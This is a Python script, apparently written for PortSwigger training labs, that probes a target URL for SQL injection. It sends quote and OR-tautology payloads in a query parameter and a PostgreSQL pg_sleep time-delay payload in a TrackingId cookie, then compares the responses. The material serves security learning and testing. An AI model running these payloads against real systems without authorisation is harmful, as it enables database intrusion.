# adding cli argument
# saving results to json

import requests
import time
import argparse
import json

#send request
def send_request(url,params=None,cookies=None):
    start_time=time.time()
    response=requests.get(
        url,
        params=params,
        cookies=cookies,
        timeout=20
    )
    end_time=time.time()
    response_time=abs(start_time-end_time)
    return{
        "url":response.url,
        "status_code":response.status_code,
        "length":len(response.text),
        "response_time":response_time,
        "text":response.text
    }

#compare two responses
def compare_responses(baseline,test):
    status_changed=(
        baseline["status_code"]!=test["status_code"]
    )
    length_difference=abs(
        baseline["length"]-test["length"]
    )
    time_difference=(
       abs(test["response_time"]-baseline["response_time"])
    )
    return{
        "status_changed":status_changed,
        "length_difference":length_difference,
        "time_difference":time_difference
    }

#average response time
def average_response_time(
        url,
        params=None,
        cookies=None,
        attempts=3
):
    total_time=0
    for _ in range(attempts):
        result=send_request(
            url,
            params=params,
            cookies=cookies
        )
        total_time+=result["response_time"]

    return abs(total_time / attempts)

#print response
def print_result(title,result):
    print(f"\n==={title}===")
    print("URL:",result["url"])
    print("status code:",result["status_code"])
    print("response length:",result["length"])
    print(
        "response time:",
        round(result["response_time"],3),
        "seconds"
    )

#configuration
parser=argparse.ArgumentParser( #creates the command-line parser.
    description="SQL Injection Testing tool"
)

parser.add_argument(#defines an argument called --url.
    "--url",
    required=True,
    help="Target URL"
)

parser.add_argument(
    "--category",
    default="Lifestyle",
    help="Category value used for the baseline request"
)

args=parser.parse_args()#reads what the user typed.

# validating input
if not args.url.startswith(("http://","https://")):
    print("[ERROR] URL is invalid")
    raise SystemExit(1) # stop the program now,'1' indicates that the program stopped becoz of an error

url=args.url

results={ #Think of this as a box where we will store our scan results.
    "target":url,
    "payload_tests":[],
    "boolean_test":{},
    "time_based_test":{}
}

#baseline
baseline_params={
    "category":args.category
}

baseline=send_request(
    url,
    params=baseline_params
)

print_result(
    "BASELINE",
    baseline
)

#basic sqli payload testing
test_payloads=[
    "'",
    "' OR '1'='1'",
    "' OR '1'='2'"
]

print("\n===sqli payload testing===")

for payload in test_payloads:

    test_params={
        "category":payload
    }

    test=send_request(
        url,
        params=test_params
    )

    comparison=compare_responses(
        baseline,
        test
    )

    #saving the results
    results["payload_tests"].append({
        "payload":payload,
        "status_code":test["status_code"],
        "response_length":test["length"],
        "response_time":test["response_time"],
        "status_changed":comparison["status_changed"],
        "length_difference":comparison["length_difference"],
        "time_difference":comparison["time_difference"]
    })

    print("\n-------------------")
    print("payload:",payload)
    print("Status Code:",test["status_code"])
    print("Response Length:",test["length"])
    print(
        "Response Time:",
        round(test["response_time"],3),
        "seconds"
    )

    if comparison["status_changed"]:
        print(
            "[!] Status changed:",
            baseline["status_code"],
            "->",
            test["status_code"]
        )

    if comparison["length_difference"] > 0:
        print(
            "[!] Response length changed by:",
            comparison["length_difference"],
            "bytes"
        )

    print(
        "[+] Time difference:",
        round(comparison["time_difference"],3),
        "seconds"
    )

#boolean based sqli
print("\n===boolean test===")

true_params={
    "category":"' OR '1'='1"
}

false_params={
    "category":"' OR '1'='2"
}

true_result=send_request(
    url,
    params=true_params
)

false_result=send_request(
    url,
    params=false_params
)

print_result(
    "TRUE CONDITION",
    true_result
)

print_result(
    "FALSE CONDITION",
    false_result
)

#boolean comparison
boolean_comparison=compare_responses(
    true_result,
    false_result
)

print("\n===== BOOLEAN COMPARISON =====")

print(
    "TRUE response length:",
    true_result["length"]
)

print(
    "FALSE response length:",
    false_result["length"]
)

print(
    "Length difference:",
    boolean_comparison["length_difference"]
)

print(
    "Status codes different:",
    boolean_comparison["status_changed"]
)

if (
    boolean_comparison["status_changed"]
    or
    boolean_comparison["length_difference"] > 0
):
    print(
        "[!] TRUE and FALSE responses differ"
    )
    print(
        "[!] Potential boolean-based SQLi behavior"
    )
else:
    print(
        "[+] TRUE and FALSE responses are similar"
    )

#saving boolean results
results["boolean_test"]={
    "true_status":true_result["status_code"],
    "false_status":false_result["status_code"],
    "true_length":true_result["length"],
    "false_length":false_result["length"],
    "length_difference":boolean_comparison["length_difference"],
    "status_changed":boolean_comparison["status_changed"]
}

#time based sqli
#     # Use this section for the PortSwigger lab where the
#     # vulnerable parameter is TrackingId.
#
#     # IMPORTANT:
#     # Replace the normal TrackingId below with the value
#     # from your authorized lab request.

print("\n===time-based sqli test===")

tracking_id="x"

#normal cookie
baseline_cookie={
    "TrackingId":tracking_id
}

baseline_average=average_response_time(
    url,
    cookies=baseline_cookie,
    attempts=3
)

print(
    "Baseline average:",
    round(baseline_average,3),
    "seconds"
)

#portswigger postgreSQl time-delay payload
time_payload=(
    "x'%3BSELECT+CASE+WHEN+(1=1)+"
    "THEN+pg_sleep(10)+"
    "ELSE+pg_sleep(0)+END--"
)

time_test_cookie={
    "TrackingId":time_payload
}

time_average=average_response_time(
    url,
    cookies=time_test_cookie,
    attempts=3
)

print(
    "Time-test average:",
    round(time_average,3),
    "seconds"
)

time_difference=abs(
    time_average
    -
    baseline_average
)

print(
    "Average delay:",
    round(time_difference,3),
    "seconds"
)

if time_difference > 5:
    print(
        "[!] Significant response delay detected"
    )
    print(
        "[!] Potential time-based SQLi behavior"
    )
else:
    print(
        "[+] No significant response delay detected"
    )

#saving time based results
results["time_based_test"]={
    "baseline_average":baseline_average,
    "time_test_average":time_average,
    "average_delay":time_difference,
    "potential_sqli":time_difference > 5
}

#saving all results to json
with open("scan_results.json","w") as file:
    json.dump(
        results,
        file,
        indent=4
    )

print("\n[+] Scan results saved to scan_results.json")